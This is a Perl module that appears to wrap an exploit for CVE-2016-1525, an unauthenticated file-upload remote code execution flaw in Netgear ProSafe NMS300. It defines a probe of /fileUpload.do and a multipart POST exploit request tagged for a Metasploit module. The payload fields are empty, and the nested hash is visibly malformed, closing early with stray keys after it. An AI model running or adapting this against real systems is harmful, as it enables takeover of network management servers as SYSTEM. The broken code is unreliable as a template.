package NETGEAR::MSF::NetgearNmsRce;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "NetgearNmsRce";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/fileUpload.do',
  PAYLOAD => '',
  TEXT => 'Checking If : /fileUpload.do Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  CVE => "CVE-2016-1525",
  DESCRIPTION => "

        Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems.

        The application has a file upload vulnerability that can be exploited by an

        unauthenticated remote attacker to execute code as the SYSTEM user.

        Two servlets are vulnerable, FileUploadController (located at

        /lib-1.0/external/flash/fileUpload.do) and FileUpload2Controller (located at /fileUpload.do).

        This module exploits the latter, and has been tested with versions 1.5.0.2, 1.4.0.17 and

        1.1.0.13.

      ",
  METHOD => "POST",
  MSF_MODULE => "netgear_nms_rce",
  PATH => "fileUpload.do?",
  PATHS => ["fileUpload.do", "fileUpload.do"],
  PAYLOAD => "",
  REFERENCES => [
    "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt",
    "http://seclists.org/fulldisclosure/2016/Feb/30",
  ],
  TITLE => "NETGEAR ProSafe Network Management System 300 Arbitrary File Upload",
  VARIABLES => {
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TSTRING' =>       "{\"success\":true, \"file\":\".jsp\"}",

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'fileUpload.do',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [POST] /fileUpload.do',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_104_3048408036_548025433',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
